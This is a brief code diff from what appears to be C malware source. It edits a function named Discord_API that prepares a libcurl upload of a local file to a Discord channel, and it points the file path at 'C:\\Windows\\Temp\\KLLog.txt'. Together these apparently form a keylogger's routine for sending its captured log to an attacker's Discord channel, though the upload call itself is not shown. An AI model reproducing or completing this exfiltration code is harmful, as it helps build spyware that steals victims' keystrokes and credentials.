@@ -27,7 +27,9 @@ void Discord_API(){
     // Replace with your actual bot token and channel ID
     const char* BOT_TOKEN = "";
     const char* CHANNEL_ID = "1223264248348676226";
-    const char* filePath = "E:\\Codeing\\Python Language\\Projects\\Project_19\\log.txt"; // Replace with your file path
+    // const char* filePath = "E:\\Codeing\\Python Language\\Projects\\Project_19\\log.txt"; // Replace with your file path
+    const char* filePath = "C:\\Windows\\Temp\\KLLog.txt"; 
+
     //Variables 
     CURL* curl = curl_easy_init();
     if (!curl) {
